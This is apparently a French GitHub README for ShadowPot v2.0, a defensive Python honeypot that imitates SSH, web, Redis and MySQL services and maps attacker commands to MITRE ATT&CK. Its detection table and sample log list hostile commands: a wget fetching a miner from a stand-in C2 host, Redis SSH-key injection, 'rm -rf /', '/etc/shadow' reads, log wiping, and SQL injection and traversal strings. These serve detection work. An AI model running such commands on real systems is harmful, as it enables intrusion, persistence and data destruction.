# 🍯 ShadowPot v2.0 — Grille de Déception Multi-Services & Moteur MITRE ATT&CK v14+

[![Python](https://img.shields.io/badge/Python-3.8%2B-blue?logo=python)](https://python.org)
[![Security](https://img.shields.io/badge/Cybersécurité-Deception%20Technology%20SOC-red?logo=kalilinux)](https://github.com/CalderaFourier-code)
[![Framework](https://img.shields.io/badge/MITRE%20ATT%26CK-v14%2B-orange)](https://attack.mitre.org/)
[![SIEM](https://img.shields.io/badge/SIEM-JSON%20Lines%20%2F%20Wazuh-green)](https://github.com/CalderaFourier-code)
[![License](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
[![Author](https://img.shields.io/badge/Auteur-Tohon%20Fourier-brightgreen)](https://github.com/CalderaFourier-code)

**ShadowPot v2.0 (SOC Production & Deception Grid Edition)** est un système de déception (*Deception Technology / Honeypot multi-leurres*) de niveau entreprise développé en Python. Il déploie simultanément **4 services leurres réalistes**, capture l'intégralité des actions hostiles en temps réel, enrichit les adresses IP avec de la **Threat Intelligence / GeoIP**, cartographie chaque commande sur le **framework MITRE ATT&CK v14+ (sans faux positif)** et alimente les pipelines **SIEM / Wazuh / Webhook**.

Conçu sous forme d'**application autonome ultra-portable sans dépendance pip obligatoire** (utilise la bibliothèque standard Python), ShadowPot intègre une console de supervision temps réel (`/_soc`) et un générateur de rapports forensiques HTML5 / CSS3.

---

## 🌟 Architecture de la Grille de Déception (4 Leurres Réalistes)

### 1. 🖥️ Shell Linux Stateful Virtuel (SSH / Telnet — Port 2222)
- **Bannière authentique :** `SSH-2.0-OpenSSH_8.4p1 Debian`.
- **Capture du Brute-Force :** Enregistrement de tous les couples utilisateur / mot de passe saisis.
- **Système de fichiers virtuel avec état :** Mémorisation de la navigation (`cd /root`, `pwd`, `ls -la`, `touch`, `mkdir`, `rm`).
- **Piège à Payloads :** Détection des téléchargements (`wget`, `curl`), simulation de téléchargement et mise en quarantaine des scripts suspects avec calcul d'empreinte.
- **Commandes système supportées :** `whoami`, `id`, `uname -a`, `uptime`, `date`, `cat /etc/passwd`, `cat /etc/shadow`, `crontab`, `ps aux`, `ifconfig`, `netstat`, `history`.

### 2. 🌐 Portail Web Admin & Traps d'Exploitation (HTTP — Port 8080)
- **Faux portail intranet :** Interface Web d'authentification réservée aux administrateurs.
- **Pièges à crawlers et bots :** Interception des sondes automatisées (`/.env`, `/wp-login.php`, `/.git/config`, `/actuator`, `/phpmyadmin`).
- **Détection des attaques applicatives :** Injections SQL (`' OR '1'='1`), Directory Traversal (`../../etc/passwd`), exécution de commandes web shell.
- **Console SOC Live (`/_soc`) :** Dashboard de supervision intégré avec rafraîchissement automatique affichant le flux d'attaques et les métriques clés.

### 3. 🔴 Leurre Cache Redis NoSQL (Port 6379)
- Les botnets et ransomwares scannent massivement le port 6379 sans mot de passe pour déposer des clés SSH autorisées ou des scripts de minage.
- ShadowPot simule un serveur Redis conforme au protocole RESP (`PING`, `INFO`, `CONFIG`, `SET`, `SAVE`, `SLAVEOF`).
- Capture et alerte immédiate sur la fameuse attaque **MITRE T1098 / T1053** (`CONFIG SET dir /root/.ssh` et `CONFIG SET dbfilename authorized_keys`).

### 4. 🗄️ Leurre Base de Données MySQL (Port 3306)
- Émission du paquet d'Initial Handshake officiel MySQL (`5.7.34-log Debian`).
- Capture des tentatives de connexion d'automates d'attaque et des identifiants (`user='root'`).
- Réponse avec code d'erreur standard 1045 (Access Denied).

---

## 🧠 Matrice MITRE ATT&CK v14+ (Détection Comportementale Affinée)

ShadowPot applique des expressions régulières avec délimiteurs stricts (`\b`) pour éliminer les faux positifs et qualifier précisément les tactiques :

| Identifiant | Technique MITRE | Tactique ATT&CK | Niveau | Action Hostile Détectée |
| :--- | :--- | :--- | :--- | :--- |
| **T1003** | OS Credential Dumping | Credential Access | **CRITICAL** | Lecture `/etc/passwd`, `/etc/shadow`, clés privées SSH |
| **T1098** | Account Manipulation | Persistence | **CRITICAL** | Injection de clés SSH dans `authorized_keys` ou via Redis |
| **T1190** | Exploit Public-Facing Application | Initial Access | **CRITICAL** | Injections SQL, exploitation de failles web, lecture `.env` |
| **T1485** | Data Destruction | Impact | **CRITICAL** | Commandes de destruction (`rm -rf /`, `mkfs`, `dd`) |
| **T1105** | Ingress Tool Transfer | Command & Control | **HIGH** | Téléchargement d'outils distants (`wget`, `curl`, `fetch`) |
| **T1053** | Scheduled Task / Job | Persistence | **HIGH** | Implantation de tâches cron (`crontab -e`, `/etc/cron*`) |
| **T1070** | Indicator Removal on Host | Defense Evasion | **HIGH** | Suppression de logs d'audit (`history -c`, `rm *.log`) |
| **T1496** | Resource Hijacking | Impact | **HIGH** | Mineurs de cryptomonnaie clandestins (`xmrig`, `minerd`) |
| **T1110** | Brute Force | Credential Access | **HIGH** | Attaques par dictionnaire SSH, Web, Redis, MySQL |
| **T1082** | System Information Discovery | Discovery | **MEDIUM** | Reconnaissance du noyau (`uname -a`, `/etc/*release`) |
| **T1046** | Network Service Discovery | Discovery | **MEDIUM** | Balayage de ports (`nmap`, `masscan`, `nc -z`) |
| **T1222** | File Permissions Modification | Defense Evasion | **MEDIUM** | Attribution de droits d'exécution (`chmod +x`, `777`) |
| **T1033** | System Owner/User Discovery | Discovery | **LOW** | Identification des privilèges (`whoami`, `id`, `who`) |
| **T1016** | System Network Configuration | Discovery | **LOW** | Cartographie réseau (`ifconfig`, `ip a`, `netstat`) |
| **T1057** | Process Discovery | Discovery | **LOW** | Énumération des processus (`ps aux`, `top`) |

---

## 🚀 Utilisation & Déploiement

### 1. Lancer la Démonstration Complète (Simulation Offensive 4 Scénarios)
Exécute une suite automatisée simulant des attaquants Tor, botnets et scanners :
```bash
python shadowpot.py --demo
```

### 2. Déployer la Grille de Déception en écoute réelle
```bash
python shadowpot.py --host 0.0.0.0 --shell-port 2222 --web-port 8080 --redis-port 6379 --mysql-port 3306
```

### 3. Supervision SOC en Direct
Ouvrez votre navigateur sur la console intégrée :
- 🔗 **Console SOC Dashboard :** `http://localhost:8080/_soc`
- 🔗 **Portail Leurre Web :** `http://localhost:8080/`

### 4. Activer les Alertes Webhook (Discord / Slack / SOC Endpoint)
```bash
python shadowpot.py --webhook "https://discord.com/api/webhooks/YOUR_WEBHOOK_URL"
```

---

## 📊 Journaux d'Incident & Intégration SIEM

Toutes les activités sont stockées dans le dossier `logs/` :
- 📄 **`logs/rapport_incidents.html`** : Rapport d'analyse forensique interactif avec indicateurs visuels et métriques clés.
- 📜 **`logs/shadowpot.jsonl`** : Flux continu au format JSON Lines, prêt pour ingestion directe par **Wazuh, Elastic (ELK) ou Splunk**.
- 🛡️ **`logs/iocs_blacklist.txt`** : Liste noire formatée des adresses IP malveillantes et techniques associées pour blocage pare-feu (`iptables` / Cisco).
- 💾 **`logs/sessions.json`** : Base forensique complète des sessions.

---

## 📸 Exemple de Rapport Forensique dans le Terminal

```text
=== SIMULATION FORENSIQUE OFFENSIVE SHADOWPOT v2.0 ===

--- SCÉNARIO 1 : INTRUSION SHELL LINUX & DÉTOURNEMENT SYSTÈME ---
[🚨 INTRUSION SHELL] Connexion entrante depuis 185.220.101.5:48210 (Allemagne (Tor Exit Node))
  [AUTH BRUTE-FORCE] Identifiants capturés : user='root', pass='toor123'
  [14:04:16] 185.220.101.5 $ whoami
    [⚡ MITRE T1033 - System Owner/User Discovery] -> Identification des privilèges
  [14:04:16] 185.220.101.5 $ cat /etc/passwd
    [⚡ MITRE T1003 - OS Credential Dumping] -> Tentative d'extraction de comptes
  [14:04:16] 185.220.101.5 $ wget http://c2-malware.darknet.ru/miner.sh
    [⚡ MITRE T1105 - Ingress Tool Transfer] -> Téléchargement d'un botnet
  [14:04:17] 185.220.101.5 $ crontab -e
    [⚡ MITRE T1053 - Scheduled Task / Job] -> Implantation de persistance cron
  [14:04:17] 185.220.101.5 $ rm -rf /var/log/audit.log
    [⚡ MITRE T1070 - Indicator Removal on Host] -> Destruction de preuves

--- SCÉNARIO 3 : PIÈGE REDIS NOSQL (INJECTION DE CLÉ SSH T1098) ---
[🚨 REDIS EXPLOITATION] Connexion entrante depuis 194.26.29.112:51204 (Russie)
  [REDIS RAW CMD] CONFIG SET dir /root/.ssh
    [⚡ MITRE T1098 - Account Manipulation (SSH Key Injection)] Injection de clés publiques SSH

[✓] Rapport forensique HTML mis à jour avec succès : logs/rapport_incidents.html
```

---

## 👤 Auteur

**Tohon Fourier**
- Développeur Cybersécurité & Ingénieur SecOps / Analyste SOC
- GitHub : [@CalderaFourier-code](https://github.com/CalderaFourier-code)
- Portfolio : [calderafourier-code.github.io](https://calderafourier-code.github.io)
